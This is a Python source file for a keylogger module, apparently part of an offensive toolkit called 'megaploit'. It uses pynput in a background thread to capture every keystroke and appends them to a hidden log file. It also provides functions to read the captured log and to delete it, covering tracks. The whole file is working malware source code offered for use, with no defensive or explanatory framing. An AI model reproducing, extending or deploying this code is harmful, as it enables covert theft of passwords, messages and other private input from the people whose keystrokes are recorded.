"""
megaploit.agent.keylogger
~~~~~~~~~~~~~~~~~~~~~~~~~
Keystroke capture module. Runs in a background daemon thread.
Writes to a platform-appropriate hidden log file.
"""

from __future__ import annotations

import os
import sys
import threading

from pynput.keyboard import Listener

from megaploit.core.config import KEYLOG_PATH


class Keylogger:
    """Capture keystrokes and append them to KEYLOG_PATH."""

    def __init__(self) -> None:
        self.path = KEYLOG_PATH
        self._keys: list = []
        self._stop_event = threading.Event()
        self._listener: Listener | None = None

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _on_press(self, key) -> None:
        self._keys.append(key)
        self._flush()

    def _flush(self) -> None:
        if not self._keys:
            return
        keys, self._keys = self._keys, []
        try:
            with open(self.path, "a", encoding="utf-8") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if "backspace" in k:
                        f.write(" [Backspace] ")
                    elif "enter" in k:
                        f.write("\n")
                    elif "shift" in k:
                        f.write(" [Shift] ")
                    elif "space" in k:
                        f.write(" ")
                    elif "caps_lock" in k:
                        f.write(" [CapsLock] ")
                    elif k.startswith("Key."):
                        f.write(f" [{k}] ")
                    else:
                        f.write(k)
        except IOError:
            pass

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> None:
        """Block until stop() is called."""
        with Listener(on_press=self._on_press) as self._listener:
            self._stop_event.wait()
            self._listener.stop()

    def stop(self) -> None:
        self._stop_event.set()

    def read_logs(self) -> str:
        try:
            with open(self.path, "r", encoding="utf-8") as f:
                return f.read()
        except FileNotFoundError:
            return ""

    def destroy(self) -> None:
        """Stop and delete the log file."""
        self.stop()
        try:
            os.remove(self.path)
        except FileNotFoundError:
            pass
